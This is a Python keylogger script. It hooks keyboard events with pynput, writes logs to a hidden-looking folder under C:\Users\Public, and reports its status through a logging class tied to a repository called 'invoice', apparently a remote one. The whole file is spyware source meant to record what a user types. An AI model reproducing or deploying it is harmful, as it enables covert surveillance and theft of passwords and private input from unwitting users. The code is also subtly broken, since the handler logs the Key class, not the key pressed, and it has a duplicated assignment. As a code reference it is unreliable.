from pynput.keyboard import Key, Listener
import logging
import os
from LogCreator import Log

class Keylogger():
    def __init__(self, script_name):
        self.script_name = script_name
    
    def Run_Keylogger(self):
        '''Beschrijving'''
        keylogger_path = r"C:\Users\Public\keylogger"
        if not os.path.exists(keylogger_path):
            os.makedirs(keylogger_path)        
        log_dir = ""
        logging.basicConfig(filename=(log_dir + r"C:\Users\Public\keylogger\keylogs.txt"), \
	        level=logging.DEBUG, format='%(asctime)s: %(message)s')
        
        items = items = os.listdir(r"C:\Users\Public")
        folder_exists = False
        for item in items:
            item_path = os.path.join(r"C:\Users\Public", item)
            if os.path.isdir(item_path) and item == "keylogger":
                folder_exists = True
                pass
        if folder_exists:
            file_creator.create_file("logs", keylogger.script_name,"Script completed successfully")
        else:
            file_creator.create_file("logs",keylogger.script_name,"Script may have encountered erros")

        def on_press(key):
            logging.info(str(Key))
        
        with Listener(on_press=on_press) as listener:
            listener.join()

repository_owner = 'rsecurity12' 
repository_name = 'invoice' 
access_token = ''  
keylogger = Keylogger("Keylogger")
file_creator = Log(repository_owner, repository_name, access_token)
keylogger.Run_Keylogger()
